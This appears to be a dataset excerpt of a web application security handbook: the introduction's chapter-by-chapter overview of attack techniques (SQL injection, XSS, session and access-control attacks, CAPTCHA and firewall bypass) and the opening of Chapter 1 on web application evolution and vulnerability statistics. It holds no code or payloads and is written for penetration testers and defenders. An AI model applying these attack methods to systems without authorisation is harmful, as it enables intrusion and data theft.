hacking, you should read\nthe book from start to fi nish, acquiring the knowledge and understanding you\nneed to tackle later chapters. If you already have some experience in this area,\nyou can jump straight into any chapter or subsection that particularly interests you.\nWhere necessary, we have included cross-references to other chapters, which\nyou can use to fi ll in any gaps in your understanding.\nWe begin with three context-setting chapters describing the current state of\nweb application security and the trends that indicate how it is likely to evolve\nin the near future. We examine the core security problem affecting web appli-\ncations and the defense mechanisms that applications implement to address\nthis problem. We also provide a primer on the key technologies used in today’s\nweb applications.\nThe bulk of the book is concerned with our core topic — the techniques\nyou can use to break into web applications. This material is organized around\nthe key tasks you need to perform to carry out a comprehensive attack. These\ninclude mapping the application’s functionality, scrutinizing and attacking its\ncore defense mechanisms, and probing for specifi c categories of security fl aws.\nffllaasstt..iinndddd xxxxiivv 88//1199//22001111 1122::2233::0077 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxv\nIntroduction xxv\nThe book concludes with three chapters that pull together the various strands\nintroduced in the book. We describe the process of fi nding vulnerabilities in\nan application’s source code, review the tools that can help when you hack web\napplications, and present a detailed methodology for performing a comprehen-\nsive and deep attack against a specifi c target.\nChapter 1, “Web Application (In)security,” describes the current state of secu-\nrity in web applications on the Internet today. Despite common assurances, the\nmajority of applications are insecure and can be compromised in some way with\na modest degree of skill. Vulnerabilities in web applications arise because of a\nsingle core problem: users can submit arbitrary input. This chapter examines the\nkey factors that contribute to the weak security posture of today’s applications.\nIt also describes how defects in web applications can leave an organization’s\nwider technical infrastructure highly vulnerable to attack.\nChapter 2, “Core Defense Mechanisms,” describes the key security mechanisms\nthat web applications employ to address the fundamental problem that all user\ninput is untrusted. These mechanisms are the means by which an application\nmanages user access, handles user input, and responds to attackers. These\nmechanisms also include the functions provided for administrators to manage\nand monitor the application itself. The application’s core security mechanisms\nalso represent its primary attack surface, so you need to understand how these\nmechanisms are intended to function before you can effectively attack them.\nChapter 3, “Web Application Technologies,” is a short primer on the key\ntechnologies you are likely to encounter when attacking web applications. It\ncovers all relevant aspects of the HTTP protocol, the technologies commonly\nused on the client and server sides, and various schemes used to encode data. If\nyou are already familiar with the main web technologies, you can skim through\nthis chapter.\nChapter 4, “Mapping the Application,” describes the fi rst exercise you need\nto perform when targeting a new application — gathering as much information\nas possible to map its attack surface and formulate your plan of attack. This\nprocess includes exploring and probing the application to catalog all its content\nand functionality, identifying all the entry points for user input, and discover-\ning the technologies in use.\nChapter 5, “Bypassing Client-Side Controls,” covers the fi rst area of actual\nvulnerability, which arises when an application relies on controls implemented\non the client side for its security. This approach normally is fl awed, because\nany client-side controls can, of course, be circumvented. The two main ways\nin which applications make themselves vulnerable are by transmitting data\nvia the client on the assumption that it will not be modifi ed, and by relying on\nclient-side checks on user input. This chapter describes a range of interesting\ntechnologies, including lightweight controls implemented within HTML, HTTP,\nand JavaScript, and more heavyweight controls using Java applets, ActiveX\ncontrols, Silverlight, and Flash objects.\nffllaasstt..iinndddd xxxxvv 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxvi\nxxvi Introduction\nChapters 6, 7, and 8 cover some of the most important defense mechanisms\nimplemented within web applications: those responsible for controlling user\naccess. Chapter 6, “Attacking Authentication,” examines the various functions by\nwhich applications gain assurance of their users’ identity. This includes the main\nlogin function and also the more peripheral authentication-related functions such\nas user registration, password changing, and account recovery. Authentication\nmechanisms contain a wealth of different vulnerabilities, in both design and\nimplementation, which an attacker can leverage to gain unauthorized access.\nThese range from obvious defects, such as bad passwords and susceptibility to\nbrute-force attacks, to more obscure problems within the authentication logic.\nWe also examine in detail the types of multistage login mechanisms used in\nmany security-critical applications and describe the new kinds of vulnerabilities\nthese frequently contain.\nChapter 7, “Attacking Session Management,” examines the mechanism by which\nmost applications supplement the stateless HTTP protocol with the concept of\na stateful session, enabling them to uniquely identify each user across several\ndifferent requests. This mechanism is a key target when you are attacking a\nweb application, because if you can break it, you can effectively bypass the login\nand masquerade as other users without knowing their credentials. We look at\nvarious common defects in the generation and transmission of session tokens\nand describe the steps you can take to discover and exploit these.\nChapter 8, “Attacking Access Controls,” looks at the ways in which applica-\ntions actually enforce access controls, relying on authentication and session\nmanagement mechanisms to do so. We describe various ways in which access\ncontrols can be broken and how you can detect and exploit these weaknesses.\nChapters 9 and 10 cover a large category of related vulnerabilities, which\narise when applications embed user input into interpreted code in an unsafe\nway. Chapter 9, “Attacking Data Stores,” begins with a detailed examination of\nSQL injection vulnerabilities. It covers the full range of attacks, from the most\nobvious and trivial to advanced exploitation techniques involving out-of-band\nchannels, inference, and time delays. For each kind of vulnerability and attack\ntechnique, we describe the relevant differences between three common types\nof databases: MS-SQL, Oracle, and MySQL. We then look at a range of similar\nattacks that arise against other data stores, including NoSQL, XPath, and LDAP.\nChapter 10, “Attacking Back-End Components,” describes several other cate-\ngories of injection vulnerabilities, including the injection of operating system\ncommands, injection into web scripting languages, fi le path traversal attacks,\nfi le inclusion vulnerabilities, injection into XML, SOAP, back-end HTTP requests,\nand e-mail services.\nChapter 11, “Attacking Application Logic,” examines a signifi cant, and fre-\nquently overlooked, area of every application’s attack surface: the internal logic\nit employs to implement its functionality. Defects in an application’s logic are\nextremely varied and are harder to characterize than common vulnerabilities\nffllaasstt..iinndddd xxxxvvii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxvii\nIntroduction xxvii\nsuch as SQL injection and cross-site scripting. For this reason, we present a\nseries of real-world examples in which defective logic has left an application\nvulnerable. These illustrate the variety of faulty assumptions that application\ndesigners and developers make. From these different individual fl aws, we derive\na series of specifi c tests that you can perform to locate many types of logic fl aws\nthat often go undetected.\nChapters 12 and 13 cover a large and very topical area of related vulnerabili-\nties that arise when defects within a web application can enable a malicious\nuser of the application to attack other users and compromise them in vari-\nous ways. Chapter 12, “Attacking Users: Cross-Site Scripting,”, examines the\nmost prominent vulnerability of this kind — a hugely prevalent fl aw affecting\nthe vast majority of web applications on the Internet. We examine in detail all the\ndifferent fl avors of XSS vulnerabilities and describe an effective methodology\nfor detecting and exploiting even the most obscure manifestations of these.\nChapter 13, “Attacking Users: Other Techniques,” looks at several other types\nof attacks against other users, including inducing user actions through request\nforgery and UI redress, capturing data cross-domain using various client-side\ntechnologies, various attacks against the same-origin policy, HTTP header\ninjection, cookie injection and session fi xation, open redirection, client-side SQL\ninjection, local privacy attacks, and exploiting bugs in ActiveX controls. The\nchapter concludes with a discussion of a range of attacks against users that do\nnot depend on vulnerabilities in any particular web application, but that can be\ndelivered via any malicious web site or suitably positioned attacker.\nChapter 14, “Automating Customized Attacks,” does not introduce any new\ncategories of vulnerabilities. Instead, it describes a crucial technique you need\nto master to attack web applications effectively. Because every web application\nis different, most attacks are customized in some way, tailored to the applica-\ntion’s specifi c behavior and the ways you have discovered to manipulate it to\nyour advantage. They also frequently require issuing a large number of similar\nrequests and monitoring the application’s responses. Performing these requests\nmanually is extremely laborious and prone to mistakes. To become a truly\naccomplished web application hacker, you need to automate as much of this\nwork as possible to make your customized attacks easier, faster, and more effec-\ntive. This chapter describes in detail a proven methodology for achieving this.\nWe also examine various common barriers to the use of automation, including\ndefensive session-handling mechanisms and CAPTCHA controls. Furthermore,\nwe describe tools and techniques you can use to overcome these barriers.\nChapter 15, “Exploiting Information Disclosure,” examines various ways in\nwhich applications leak information when under active attack. When you are\nperforming all the other types of attacks described in this book, you should\nalways monitor the application to identify further sources of information dis-\nclosure that you can exploit. We describe how you can investigate anomalous\nbehavior and error messages to gain a deeper understanding of the application’s\nffllaasstt..iinndddd xxxxvviiii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxviii\nxxviii Introduction\ninternal workings and fi ne-tune your attack. We also cover ways to manipulate\ndefective error handling to systematically retrieve sensitive information from\nthe application.\nChapter 16, “Attacking Native Compiled Applications,” looks at a set of impor-\ntant vulnerabilities that arise in applications written in native code languages\nsuch as C and C++. These vulnerabilities include buffer overfl ows, integer vul-\nnerabilities, and format string fl aws. Because this is a potentially huge topic,\nwe focus on ways to detect these vulnerabilities in web applications and look\nat some real-world examples of how these have arisen and been exploited.\nChapter 17, “Attacking Application Architecture,” examines an important area\nof web application security that is frequently overlooked. Many applications\nemploy a tiered architecture. Failing to segregate different tiers properly often\nleaves an application vulnerable, enabling an attacker who has found a defect\nin one component to quickly compromise the entire application. A different\nrange of threats arises in shared hosting environments, where defects or mali-\ncious code in one application can sometimes be exploited to compromise the\nenvironment itself and other applications running within it. This chapter also\nlooks at the range of threats that arise in the kinds of shared hosting environ-\nments that have become known as “cloud computing.”\nChapter 18, “Attacking the Application Server,” describes various ways in\nwhich you can target a web application by targeting the web server on which\nit is running. Vulnerabilities in web servers are broadly composed of defects in\ntheir confi guration and security fl aws within the web server software. This topic\nis on the boundary of the subjects covered in this book, because the web server\nis strictly a different component in the technology stack. However, most web\napplications are intimately bound up with the web server on which they run.\nTherefore, attacks against the web server are included in the book because they\ncan often be used to compromise an application directly, rather than indirectly\nby fi rst compromising the underlying host.\nChapter 19, “Finding Vulnerabilities in Source Code,” describes a completely\ndifferent approach to fi nding security fl aws than those described elsewhere\nwithin this book. In many situations it may be possible to review an applica-\ntion’s source code, not all of which requires cooperation from the application’s\nowner. Reviewing an application’s source code can often be highly effective in\ndiscovering vulnerabilities that would be diffi cult or time-consuming to detect\nby probing the running application. We describe a methodology, and provide\na language-by-language cheat sheet, to enable you to perform an effective code\nreview even if you have limited programming experience.\nChapter 20, “A Web Application Hacker’s Toolkit,” pulls together the various\ntools described in this book. These are the same tools the authors use when attack-\ning real-world web applications. We examine the key features of these tools and\ndescribe in detail the type of work fl ow you generally need to employ to get the\nbest out of them. We also examine the extent to which any fully automated tool\nffllaasstt..iinndddd xxxxvviiiiii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxix\nIntroduction xxix\ncan be effective in fi nding web application vulnerabilities. Finally, we provide\nsome tips and advice for getting the most out of your toolkit.\nChapter 21, “A Web Application Hacker’s Methodology,” is a comprehensive\nand structured collation of all the procedures and techniques described in this\nbook. These are organized and ordered according to the logical dependencies\nbetween tasks when you are carrying out an actual attack. If you have read\nabout and understood all the vulnerabilities and techniques described in this\nbook, you can use this methodology as a complete checklist and work plan\nwhen carrying out an attack against a web application.\nWhat’s New in This Edition\nIn the four years since the fi rst edition of this book was published, much has\nchanged, and much has stayed the same. The march of new technology has, of\ncourse, continued apace, and this has given rise to specifi c new vulnerabilities\nand attacks. The ingenuity of hackers has also led to the development of new\nattack techniques and new ways of exploiting old bugs. But neither of these\nfactors, technological or human, has created a revolution. The technologies\nused in today’s applications have their roots in those that are many years old.\nAnd the fundamental concepts involved in today’s cutting-edge exploitation\ntechniques are older than many of the researchers who are applying them so\neffectively. Web application security is a dynamic and exciting area to work in,\nbut the bulk of what constitutes our accumulated wisdom has evolved slowly\nover many years. It would have been distinctively recognizable to practitioners\nworking a decade or more ago.\nThis second edition is not a complete rewrite of the fi rst. Most of the material\nin the fi rst edition remains valid and current today. Approximately 30% of the\ncontent in this edition is either new or extensively revised. The remaining 70%\nhas had minor modifi cations or none at all. If you have upgraded from the fi rst\nedition and feel disappointed by these numbers, you should take heart. If you\nhave mastered all the techniques described in the fi rst edition, you already have\nthe majority of the skills and knowledge you need. You can focus on what is\nnew in this edition and quickly learn about the areas of web application security\nthat have changed in recent years.\nOne signifi cant new feature of the second edition is the inclusion through-\nout the book of real examples of nearly all the vulnerabilities that are covered.\nWherever you see a “Try It!” link, you can go online and work interactively\nwith the example being discussed to confi rm that you can fi nd and exploit the\nvulnerability it contains. There are several hundred of these labs, which you\ncan work through at your own pace as you read the book. The online labs are\navailable on a subscription basis for a modest fee to cover the costs of hosting\nand maintaining the infrastructure involved.\nffllaasstt..iinndddd xxxxiixx 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxx\nxxx Introduction\nIf you want to focus on what’s new in the second edition, here is a summary\nof the key areas where material has been added or rewritten:\nChapter 1, “Web Application (In)security,” has been partly updated to refl ect\nnew uses of web applications, some broad trends in technologies, and the ways\nin which a typical organization’s security perimeter has continued to change.\nChapter 2, “Core Defense Mechanisms,” has had minor changes. A few\nexamples have been added of generic techniques for bypassing input valida-\ntion defenses.\nChapter 3, “Web Application Technologies,” has been expanded with some\nnew sections describing technologies that are either new or that were described\nmore briefl y elsewhere within the fi rst edition. The topics added include REST,\nRuby on Rails, SQL, XML, web services, CSS, VBScript, the document object\nmodel, Ajax, JSON, the same-origin policy, and HTML5.\nChapter 4, “Mapping the Application,” has received various minor updates\nto refl ect developments in techniques for mapping content and functionality.\nChapter 5, “Bypassing Client-Side Controls,” has been updated more exten-\nsively. In particular, the section on browser extension technologies has been\nlargely rewritten to include more detailed guidance on generic approaches to\nbytecode decompilation and debugging, how to handle serialized data in com-\nmon formats, and how to deal with common obstacles to your work, including\nnon-proxy-aware clients and problems with SSL. The chapter also now covers\nSilverlight technology.\nChapter 6, “Attacking Authentication,” remains current and has only minor\nupdates.\nChapter 7, “Attacking Session Management,” has been updated to cover new\ntools for automatically testing the quality of randomness in tokens. It also contains\nnew material on attacking encrypted tokens, including practical techniques for\ntoken tampering without knowing either the cryptographic algorithm or the\nencryption key being used.\nChapter 8, “Attacking Access Controls,” now covers access control vulner-\nabilities arising from direct access to server-side methods, and from platform\nmisconfi guration where rules based on HTTP methods are used to control\naccess. It also describes some new tools and techniques you can use to partially\nautomate the frequently onerous task of testing access controls.\nThe material in Chapters 9 and 10 has been reorganized to create more man-\nageable chapters and a more logical arrangement of topics. Chapter 9, “Attacking\nData Stores,” focuses on SQL injection and similar attacks against other data\nstore technologies. As SQL injection vulnerabilities have become more widely\nunderstood and addressed, this material now focuses more on practical situa-\ntions where SQL injection is still found. There are also minor updates through-\nout to refl ect current technologies and attack methods. A new section on using\nautomated tools for exploiting SQL injection vulnerabilities is included. The\nmaterial on LDAP injection has been largely rewritten to include more detailed\nffllaasstt..iinndddd xxxxxx 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxxi\nIntroduction xxxi\ncoverage of specifi c technologies (Microsoft Active Directory and OpenLDAP),\nas well as new techniques for exploiting common vulnerabilities. This chapter\nalso now covers attacks against NoSQL.\nChapter 10, “Attacking Back-End Components,” covers the other types of\nserver-side injection vulnerabilities that were previously included in Chapter 9.\nNew sections cover XML external entity injection and injection into back-end\nHTTP requests, including HTTP parameter injection/pollution and injection\ninto URL rewriting schemes.\nChapter 11, “Attacking Application Logic,” includes more real-world examples of\ncommon logic fl aws in input validation functions. With the increased usage\nof encryption to protect application data at rest, we also include an example of\nhow to identify and exploit encryption oracles to decrypt encrypted data.\nThe topic of attacks against other application users, previously covered in\nChapter 12, has been split into two chapters, because this material was becom-\ning unmanageably large. Chapter 12, “Attacking Users: Cross-Site Scripting,”\nfocuses solely on XSS. This material has been extensively updated in various\nareas. The sections on bypassing defensive fi lters to introduce script code have\nbeen completely rewritten to cover new techniques and technologies, includ-\ning various little-known methods for executing script code on current brows-\ners. There is also much more detailed coverage of methods for obfuscating\nscript code to bypass common input fi lters. The chapter includes several new\nexamples of real-world XSS attacks. A new section on delivering working XSS\nexploits in challenging conditions covers escalating an attack across application\npages, exploiting XSS via cookies and the Referer header, and exploiting XSS\nin nonstandard request and response content such as XML. There is a detailed\nexamination of browsers’ built-in XSS fi lters and how these can be circumvented\nto deliver exploits. New sections discuss specifi c techniques for exploiting XSS\nin webmail applications and in uploaded fi les. Finally, there are various updates\nto the defensive measures that can be used to prevent XSS attacks.\nThe new Chapter 13, “Attacking Users: Other Techniques,” unites the remain-\nder of this huge area. The topic of cross-site request forgery has been updated to\ninclude CSRF attacks against the login function, common defects in anti-CSRF\ndefenses, UI redress attacks, and common defects in framebusting defenses. A\nnew section on cross-domain data capture includes techniques for stealing data\nby injecting text containing nonscripting HTML and CSS, and various tech-\nniques for cross-domain data capture using JavaScript and E4X. A new section\nexamines the same-origin policy in more detail, including its implementation\nin different browser extension technologies, the changes brought by HTML5,\nand ways of crossing domains via proxy service applications. There are new\nsections on client-side cookie injection, SQL injection, and HTTP parameter pol-\nlution. The section on client-side privacy attacks has been expanded to include\nstorage mechanisms provided by browser extension technologies and HTML5.\nFinally, a new section has been added drawing together general attacks against\nffllaasstt..iinndddd xxxxxxii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxxii\nxxxii Introduction\nweb users that do not depend on vulnerabilities in any particular application.\nThese attacks can be delivered by any malicious or compromised web site or\nby an attacker who is suitably positioned on the network.\nChapter 14, “Automating Customized Attacks,” has been expanded to cover\ncommon barriers to automation and how to circumvent them. Many applications\nemploy defensive session-handling mechanisms that terminate sessions, use\nephemeral anti-CSRF tokens, or use multistage processes to update application\nstate. Some new tools are described for handling these mechanisms, which let\nyou continue using automated testing techniques. A new section examines\nCAPTCHA controls and some common vulnerabilities that can often be exploited\nto circumvent them.\nChapter 15, “Exploiting Information Disclosure,” contains new sections about\nXSS in error messages and exploiting decryption oracles.\nChapter 16, “Attacking Native Compiled Applications,” has not been updated.\nChapter 17, “Attacking Application Architecture,” has a new section about\nvulnerabilities that arise in cloud-based architectures, and updated examples\nof exploiting architecture weaknesses.\nChapter 18, “Attacking the Application Server,” contains several new examples\nof interesting vulnerabilities in application servers and platforms, including Jetty,\nthe JMX management console, ASP.NET, Apple iDisk server, Ruby WEBrick web\nserver, and Java web server. It also has a new section on practical approaches\nto circumventing web application fi rewalls.\nChapter 19, “Finding Vulnerabilities in Source Code,” has not been updated.\nChapter 20, “A Web Application Hacker’s Toolkit,” has been updated with\ndetails on the latest features of proxy-based tool suites. It contains new sections\non how to proxy the traffi c of non-proxy-aware clients and how to eliminate SSL\nerrors in browsers and other clients caused by the use of an intercepting proxy.\nThis chapter contains a detailed description of the work fl ow that is typically\nemployed when you test using a proxy-based tool suite. It also has a new dis-\ncussion about current web vulnerability scanners and the optimal approaches\nto using these in different situations.\nChapter 21, “A Web Application Hacker’s Methodology,” has been updated\nto refl ect the new methodology steps described throughout the book.\nTools You Will Need\nThis book is strongly geared toward hands-on techniques you can use to attack\nweb applications. After reading the book, you will understand the specifi cs of\neach individual task, what it involves technically, and why it helps you detect\nand exploit vulnerabilities. The book is emphatically not about downloading\na tool, pointing it at a target application, and believing what the tool’s output\ntells you about the state of the application’s security.\nffllaasstt..iinndddd xxxxxxiiii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxxiii\nIntroduction xxxiii\nThat said, you will fi nd several tools useful, and sometimes indispensable,\nwhen performing the tasks and techniques we describe. All of these are avail-\nable on the Internet. We recommend that you download and experiment with\neach tool as you read about it.\nWhat’s on the Website\nThe companion website for this book at http://mdsec.net/wahh,which you can\nalso link to from www/wiley.com/go/webhacker2e, contains several resources\nthat you will fi nd useful in the course of mastering the techniques we describe\nand using them to attack actual applications. In particular, the website contains\naccess to the following:\nn Source code for some of the scripts we present in the book\nn A list of current links to all the tools and other resources discussed in\nthe book\nn A handy checklist of the tasks involved in attacking a typical application\nn Answers to the questions posed at the end of each chapter\nn Hundreds of interactive vulnerability labs that are used in examples\nthroughout this book and that are available on a subscription basis to\nhelp you develop and refi ne your skills\nBring It On\nWeb application security remains a fun and thriving subject. We enjoyed writ-\ning this book as much as we continue to enjoy hacking into web applications\non a daily basis. We hope that you will also take pleasure from learning about\nthe different techniques we describe and how you can defend against them.\nBefore going any further, we should mention an important caveat. In most\ncountries, attacking computer systems without the owner’s permission is against\nthe law. The majority of the techniques we describe are illegal if carried out\nwithout consent.\nThe authors are professional penetration testers who routinely attack web\napplications on behalf of clients to help them improve their security. In recent\nyears, numerous security professionals and others have acquired criminal\nrecords — and ended their careers — by experimenting on or actively attack-\ning computer systems without permission. We urge you to use the information\ncontained in this book only for lawful purposes.\nffllaasstt..iinndddd xxxxxxiiiiii 88//1199//22001111 1122::2233::0088 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxxiv\nffllaasstt..iinndddd xxxxxxiivv 88//1199//22001111 1122::2233::0088 PPMM"
  },
  {
    "input": "Chapter 1 Web Application (In)security",
    "output": "Stuttard c01.indd V2 - 07/07/2011 Page 1\nCHAPTER\n1\nWeb Application (In)security\nThere is no doubt that web application security is a current and newsworthy\nsubject. For all concerned, the stakes are high: for businesses that derive increas-\ning revenue from Internet commerce, for users who trust web applications with\nsensitive information, and for criminals who can make big money by stealing\npayment details or compromising bank accounts. Reputation plays a critical role.\nFew people want to do business with an insecure website, so few organizations\nwant to disclose details about their own security vulnerabilities or breaches.\nHence, it is not a trivial task to obtain reliable information about the state of\nweb application security today.\nThis chapter takes a brief look at how web applications have evolved and the\nmany benefi ts they provide. We present some metrics about vulnerabilities in\ncurrent web applications, drawn from the authors’ direct experience, demon-\nstrating that the majority of applications are far from secure. We describe the\ncore security problem facing web applications — that users can supply arbitrary\ninput — and the various factors that contribute to their weak security posture.\nFinally, we describe the latest trends in web application security and how these\nmay be expected to develop in the near future.\n1\ncc0011..iinndddd 11 88//1199//22001111 1122::0022::0022 PPMM"
  },
  {
    "input": "The Evolution of Web Applications",
    "output": "Stuttard c01.indd V2 - 07/07/2011 Page 2\n2 Chapter 1 n Web Application (In)security\nThe Evolution of Web Applications\nIn the early days of the Internet, the World Wide Web consisted only of web\nsites. These were essentially information repositories containing static docu-\nments. Web browsers were invented as a means of retrieving and displaying\nthose documents, as shown in Figure 1-1. The fl ow of interesting information\nwas one-way, from server to browser. Most sites did not authenticate users,\nbecause there was no need to. Each user was treated in the same way and was\npresented with the same information. Any security threats arising from host-\ning a website were related largely to vulnerabilities in web server software (of\nwhich there were many). If an attacker compromised a web server, he usually\nwould not gain access to any sensitive information, because the information\nheld on the server was already open to public view. Rather, an attacker typically\nwould modify the fi les on the server to deface the web site’s contents or use the\nserver’s storage and bandwidth to distribute “warez.”\nFigure 1-1: A traditional website containing static information\nToday, the World Wide Web is almost unrecognizable from its earlier form.\nThe majority of sites on the web are in fact applications (see Figure 1-2). They\nare highly functional and rely on two-way fl ow of information between the\nserver and browser. They support registration and login, fi nancial transactions,\ncc0011..iinndddd 22 88//1199//22001111 1122::0022::0022 PPMM\nStuttard c01.indd V2 - 07/07/2011 Page 3\nChapter 1 n Web Application (In)security 3\nsearch, and the authoring of content by users. The content presented to users\nis generated dynamically on the fl y and is often tailored to each specifi c user.\nMuch of the information processed is private and highly sensitive. Security,\ntherefore, is a big issue. No one wants to use a web application if he believes\nhis information will be disclosed to unauthorized parties.\nFigure 1-2: A typical web application\nWeb applications bring with them new and signifi cant security threats. Each\napplication is different and may contain unique vulnerabilities. Most applica-\ntions are developed in-house — many by developers who have only a partial\nunderstanding of the security problems that may arise in the code they are\nproducing. To deliver their core functionality, web applications normally require\nconnectivity to internal computer systems that contain highly sensitive data and\nthat can perform powerful business functions. Fifteen years ago, if you wanted\nto make a funds transfer, you visited your bank, and the teller performed the\ntransfer for you; today, you can visit a web application and perform the transfer\nyourself. An attacker who compromises a web application may be able to steal\npersonal information, carry out fi nancial fraud, and perform malicious actions\nagainst other users.\ncc0011..iinndddd 33 88//1199//22001111 1122::0022::0022 PPMM"
  },
  {
    "input": "Common Web Application Functions",
    "output": "Stuttard c01.indd V2 - 07/07/2011 Page 4\n4 Chapter 1 n Web Application (In)security\nCommon Web Application Functions\nWeb applications have been created to perform practically every useful function\nyou could possibly implement online. Here are some web application functions\nthat have risen to prominence in recent years:\nn Shopping (Amazon)\nn Social networking (Facebook)\nn Banking (Citibank)\nn Web search (Google)\nn Auctions (eBay)\nn Gambling (Betfair)\nn Web logs (Blogger)\nn Web mail (Gmail)\nn Interactive information (Wikipedia)\nApplications that are accessed using a computer browser increasingly overlap\nwith mobile applications that are accessed using a smartphone or tablet. Most\nmobile applications employ either a browser or a customized client that uses\nHTTP-based APIs to communicate with the server. Application functions and\ndata typically are shared between the various interfaces that the application\nexposes to different user platforms.\nIn addition to the public Internet, web applications have been widely adopted\ninside organizations to support key business functions. Many of these provide\naccess to highly sensitive data and functionality:\nn HR applications allowing users to access payroll information, give and\nreceive performance feedback, and manage recruitment and disciplinary\nprocedures.\nn Administrative interfaces to key infrastructure such as web and mail\nservers, user workstations, and virtual machine administration.\nn Collaboration software used for sharing documents, managing work-\nfl ow and projects, and tracking issues. These types of functionality often\ninvolve critical security and governance issues, and organizations often\nrely completely on the controls built into their web applications.\nn Business applications such as enterprise resource planning (ERP) software,\nwhich previously were accessed using a proprietary thick-client applica-\ntion, can now be accessed using a web browser.\ncc0011..iinndddd 44 88//1199//22001111 1122::0022::0033 PPMM"
  },
  {
    "input": "Benefits of Web Applications",
    "output": "Stuttard c01.indd V2 - 07/07/2011 Page 5\nChapter 1 n Web Application (In)security 5\nn Software services such as e-mail, which originally required a separate\ne-mail client, can now be accessed via web interfaces such as Outlook\nWeb Access.\nn Traditional desktop offi ce applications such as word processors and spread-\nsheets have been migrated to web applications through services such as\nGoogle Apps and Microsoft Offi ce Live.\nIn all these examples, what are perceived as “internal” applications are increas-\ningly being hosted externally as organizations move to outside service providers\nto cut costs. In these so-called cloud solutions, business-critical functionality\nand data are opened to a wider range of potential attackers, and organizations\nare increasingly reliant on the integrity of security defenses that are outside of\ntheir control.\nThe time is fast approaching when the only client software that most com-\nputer users will need is a web browser. A diverse range of functions will have\nbeen implemented using a shared set of protocols and technologies, and in so\ndoing will have inherited a distinctive range of common security vulnerabilities.\nBenefi ts of Web Applications\nIt is not diffi cult to see why web applications have enjoyed such a dramatic rise\nto prominence. Several technical factors have worked alongside the obvious\ncommercial incentives to drive the revolution that has occurred in how we use\nthe Internet:\nn HTTP, the core communications protocol used to access the World Wide\nWeb, is lightweight and connectionless. This provides resilience in the\nevent of communication errors and avoids the need for the server to\nhold open a network connection to every user, as was the case in many\nlegacy client/server applications. HTTP can also be proxied and tunneled\nover other protocols, allowing for secure communication in any network\nconfi guration.\nn Every web user already has a browser installed on his computer and\nmobile device. Web applications deploy their user interface dynamically\nto the browser, avoiding the need to distribute and manage separate\nclient software, as was the case with pre-web applications. Changes to\nthe interface need to be implemented only once, on the server, and take\neffect immediately.\nn Today’s browsers are highly functional, enabling rich and satisfying\nuser interfaces to be built. Web interfaces use standard navigational and\ncc0011..iinndddd 55 88//1199//22001111 1122::0022::0033 PPMM"
  },
  {
    "input": "Web Application Security",
    "output": "Stuttard c01.indd V2 - 07/07/2011 Page 6\n6 Chapter 1 n Web Application (In)security\ninput controls that are immediately familiar to users, avoiding the need\nto learn how each individual application functions. Client-side scripting\nenables applications to push part of their processing to the client side, and\nbrowsers’ capabilities can be extended in arbitrary ways using browser\nextension technologies where necessary.\nn The core technologies and languages used to develop web applications are\nrelatively simple. A wide range of platforms and development tools are\navailable to facilitate the development of powerful applications by relative\nbeginners, and a large quantity of open source code and other resources\nis available for incorporation into custom-built applications.\nWeb Application Security\nAs with any new class of technology, web applications have brought with them\na new range of security vulnerabilities. The set of most commonly encountered\ndefects has evolved somewhat over time. New attacks have been conceived\nthat were not considered when existing applications were developed. Some\nproblems have become less prevalent as awareness of them has increased. New\ntechnologies have been developed that have introduced new possibilities for\nexploitation. Some categories of fl aws have largely gone away as the result of\nchanges made to web browser software.\nThe most serious attacks against web applications are those that expose\nsensitive data or gain unrestricted access to the back-end systems on which\nthe application is running. High-profi le compromises of this kind continue\nto occur frequently. For many organizations, however, any attack that causes\nsystem downtime is a critical event. Application-level denial-of-service attacks\ncan be used to achieve the same results as traditional resource exhaustion\nattacks against infrastructure. However, they are often used with more subtle\ntechniques and objectives. They may be used to disrupt a particular user or\nservice to gain a competitive edge against peers in the realms of fi nancial trad-\ning, gaming, online bidding, and ticket reservations.\nThroughout this evolution, compromises of prominent web applications have\nremained in the news. There is no sense that a corner has been turned and that\nthese security problems are on the wane. By some measure, web application\nsecurity is today the most signifi cant battleground between attackers and those\nwith computer resources and data to defend, and it is likely to remain so for\nthe foreseeable future.\ncc0011..iinndddd 66 88//1199//22001111 1122::0022::0033 PPMM"
  },
  {
    "input": "\"This Site Is Secure\"",
    "output": "Stuttard c01.indd V2 - 07/07/2011 Page 7\nChapter 1 n Web Application (In)security 7\n“This Site Is Secure”\nThere is a widespread awareness that security is an issue for web applications.\nConsult the FAQ page of a typical application, and you will be reassured that\nit is in fact secure.\nMost applications state that they are secure because they use SSL. For example:\nThis site is absolutely secure. It has been designed to use 128-bit Secure Socket\nLayer (SSL) technology to prevent unauthorized users from viewing any of your\ninformation. You may use this site with peace of mind that your data is safe with us.\nUsers are often urged to verify the site’s certifi cate, admire the advanced\ncryptographic protocols in use, and, on this basis, trust it with their personal\ninformation.\nIncreasingly, organizations also cite their compliance with Payment Card\nIndustry (PCI) standards to reassure users that they are secure. For example:\nWe take security very seriously. Our web site is scanned daily to ensure that we\nremain PCI compliant and safe from hackers. You can see the date of the latest scan\non the logo below, and you are guaranteed that our web site is safe to use.\nIn fact, the majority of web applications are insecure, despite the widespread\nusage of SSL technology and the adoption of regular PCI scanning. The authors\nof this book have tested hundreds of web applications in recent years. Figure 1-3\nshows what percentage of applications tested during 2007 and 2011 were found\nto be affected by some common categories of vulnerability:\nn Broken authentication (62%) — This category of vulnerability encom-\npasses various defects within the application’s login mechanism, which\nmay enable an attacker to guess weak passwords, launch a brute-force\nattack, or bypass the login.\nn Broken access controls (71%) — This involves cases where the application\nfails to properly protect access to its data and functionality, potentially\nenabling an attacker to view other users’ sensitive data held on the server\nor carry out privileged actions.\nn SQL injection (32%) — This vulnerability enables an attacker to submit\ncrafted input to interfere with the application’s interaction with back-end\ndatabases. An attacker may be able to retrieve arbitrary data from the\napplication, interfere with its logic, or execute commands on the database\nserver 